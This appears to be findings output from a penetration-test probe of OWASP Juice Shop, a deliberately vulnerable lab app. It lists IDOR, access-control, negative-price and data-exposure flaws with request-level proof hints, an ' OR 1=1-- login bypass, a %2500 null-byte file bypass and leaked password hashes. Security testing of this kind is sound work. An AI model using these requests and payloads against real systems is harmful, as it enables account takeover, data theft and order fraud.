summary: Comprehensive authz/logic differentials probe completed. Tested with dual actors (admin, user_a, user_b) across all identified surfaces. Found 15 bookable candidates across IDOR, broken access control, business logic flaws, and data exposure categories.

candidates.title: IDOR - Cross-User Basket Checkout (Order Theft)
candidates.proof_excerpt: User A (bid=9) successfully checked out User B's basket (bid=10) with items User B had added, receiving orderConfirmation "f806-5f3ba92e2a9463d2". The order appeared in User A's order history (totalPrice:3.98) while User B's order history was empty. This allows any authenticated user to steal another user's basket items.
candidates.poc_hint: Authenticate as different user, POST /rest/basket/{victim_basket_id}/checkout

candidates.title: IDOR - Cross-User Profile Access
candidates.proof_excerpt: GET /api/Users/31 as User A returned {"email":"testuser_b@test.com","role":"customer"}. GET /api/Users/1 as User A returned {"email":"admin@juice-sh.op","role":"admin"}. Any authenticated user can read any user's profile including email, role, and isActive status.
candidates.poc_hint: GET /api/Users/{target_id} with any valid JWT token

candidates.title: IDOR - Cross-User Basket Reading
candidates.proof_excerpt: GET /rest/basket/10 (User B's basket) as User A returned {"id":10,"UserId":31,"Products":[{"id":1,"name":"Apple Juice (1000ml)","price":1.99}]}. GET /rest/basket/1 (admin's basket) as User A also returned full basket data.
candidates.poc_hint: GET /rest/basket/{target_bid} with any valid JWT token

candidates.title: Broken Access Control - Admin Configuration Leak
candidates.proof_excerpt: GET /rest/admin/application-configuration as regular user (User A) returned full config object containing: Google OAuth clientId "1005568560502-6hm16lef8oh46hr2d98vf2ohlnj4nfhq.apps.googleusercontent.com", full product catalog with prices/deluxePrices, all challenge configurations with XSS bonus payload, chatbot model/avatar settings, social media URLs, CSF hash, and memory data with geo-stalking answers.
candidates.poc_hint: GET /rest/admin/application-configuration with any valid JWT (no admin role required)

candidates.title: Broken Access Control - Admin Version Endpoint
candidates.proof_excerpt: GET /rest/admin/application-version as regular user returned {"version":"20.1.1"}. Admin-only version info is accessible to any authenticated user.
candidates.poc_hint: GET /rest/admin/application-version with any valid JWT

candidates.title: Business Logic - Negative Quantity Pricing Manipulation
candidates.proof_excerpt: POST with {"ProductId":2,"BasketId":9,"quantity":-5} returned success with {"quantity":-5}. Checkout resulted in order with totalPrice:-14.950000000000001 and products:[{"quantity":-5,"name":"Orange Juice (1000ml)","price":2.99,"total":-14.95}]. Negative quantities produce negative total prices.
candidates.poc_hint: POST /api/BasketItems with negative quantity value to get negative order totals

candidates.title: Forged Feedback - Cross-User Feedback Submission
candidates.proof_excerpt: POST as User A with {"UserId":31,"comment":"Forged feedback from A pretending to be B","rating":3,"captchaId":2,"captcha":"12"} returned success with {"id":16,"UserId":31}. User A successfully submitted feedback attributed to User B.
candidates.poc_hint: POST /api/Feedbacks with arbitrary UserId value to impersonate other users

candidates.title: Broken Access Control - Unauthorized Feedback Deletion
candidates.proof_excerpt: DELETE /api/Feedbacks/1 as User A (non-admin) returned {"status":"success","data":{}}. Any authenticated user can delete any feedback without authorization.
candidates.poc_hint: DELETE /api/Feedbacks/{id} with any valid JWT

candidates.title: Excessive Data Exposure - Memories API Leaks Password Hashes
candidates.proof_excerpt: GET /rest/memories as User A returned 10 memories each with full User object including password hashes: {"email":"bjoern@owasp.org","password":"cc03e747a6afbbcbf8be7668acfebee5"}, {"email":"bjoern.kimminich@gmail.com","password":"6edd9d726cbdc873c539e41ae8757b8c"}, {"email":"ethereum@juice-sh.op","password":"2c17c6393771ee3048ae34d6b380c5ec"}, {"email":"john@juice-sh.op","password":"00479e957b6b42c459ee5746478e4d45"}, {"email":"emma@juice-sh.op","password":"402f1c4a75e316afec5a6ea63147f739"}. Also exposes deluxeToken values.
candidates.poc_hint: GET /rest/memories with any valid JWT to get all user password hashes

candidates.title: Unauthenticated Order Tracking
candidates.proof_excerpt: GET /rest/track-order/f806-ce62ebfcca035608 without any authentication returned full order details: {"totalPrice":-14.95,"products":[{"quantity":-5,"name":"Orange Juice (1000ml)","price":2.99,"total":-14.95}],"email":"t*st*s*r_*@t*st.c*m"}. GET /rest/track-order/5267-3122026aa8431150 as User A returned admin's order with masked email.
candidates.poc_hint: Any order can be tracked without authentication using its orderId

candidates.title: IDOR - Cross-User BasketItem Access
candidates.proof_excerpt: GET /api/BasketItems?basketId=10 as User A returned all BasketItems across multiple baskets (baskets 2,3,4,5) including items that do not belong to User A. The basketId filter appears to be ignored, leaking global basket data.
candidates.poc_hint: GET /api/BasketItems with any basketId parameter

candidates.title: Excessive Data Exposure - Challenge Definitions
candidates.proof_excerpt: GET /api/Challenges without authentication returned all challenge definitions including names, categories, difficulty levels, descriptions, and solved status for 100+ challenges. Exposes internal CTF challenge structure.
candidates.poc_hint: GET /api/Challenges - no authentication required

candidates.title: Excessive Data Exposure - Inventory and Stock Levels
candidates.proof_excerpt: GET /api/Quantitys as User A returned all product quantities and per-user limits for 56 products. Reveals inventory levels (e.g., ProductId 27 has quantity 0, ProductId 33 has limitPerUser:1) enabling stock manipulation attacks.
candidates.poc_hint: GET /api/Quantitys with any valid JWT

candidates.title: Weak Access Control - Coupon Code Exposure in FTP
candidates.proof_excerpt: GET /ftp/coupons_2013.md.bak%2500.md (null byte bypass) returned coupon codes: n<MibgC7sn, mNYS#gC7sn, o*IVigC7sn, k#pDlgC7sn, etc. Coupon data leaked via directory listing and null byte bypass.
candidates.poc_hint: Use null byte injection (%2500.md) to access .bak files in /ftp/

candidates.title: Unauthenticated Order History (Admin)
candidates.proof_excerpt: GET /rest/order-history as admin returned order history with partially masked emails e.g. "*dm*n@j**c*-sh.*p" and product details. Note: regular users only see their own orders but admin sees all. Order tracking is completely unauthenticated.
candidates.poc_hint: Admin can view all orders; order tracking via /rest/track-order is public

facts.summary: Admin user (id=1, bid=1) obtained via SQL injection login bypass (email=' OR 1=1--)
User A created: id=30, bid=9, role=customer, email=testuser_a@test.com
User B created: id=31, bid=10, role=customer, email=testuser_b@test.com
JWT tokens use RS256 algorithm - no expiry (iat only, no exp claim)
Basket items can be added with negative quantities - no input validation on quantity
Checkout succeeds with empty baskets, negative totals, and with addressId parameter
Feedback requires captcha which exposes answer in response
/rest/admin/application-configuration is accessible to all authenticated users regardless of role
Password hashes are MD5 (cryptographically weak) stored in database and exposed via multiple endpoints
memories API includes full user objects with password hashes via Sequelize eager loading
No CSRF protection on API endpoints (Bearer token only, no CSRF tokens)

deadends: PATCH /api/Users/{id} - Unexpected path error (500) - user profile update via API not supported
/rest/basket/{id}/coupon - Unexpected path for all methods (GET/POST/PUT/DELETE) - coupon application via REST API not found
/rest/products/{id}/reviews - POST/DELETE/PATCH all return 'Unexpected path' (500) - review management via REST not supported
/api/Addresss/{id} - 'Malicious activity detected' when accessing address owned by another user
/rest/user/whoami - Returns empty user object {} even with Authorization header - may use cookie-based auth
/rest/order-history - Blocks with 'Blocked illegal activity' for requests from certain IPs
/api/ (root) - Unexpected path error (500) - no API index/root endpoint
/administration - Returns SPA HTML, not actual admin panel
POST /rest/basket/{id}/checkout with addressId parameter works but doesn't prevent unauthorized basket access
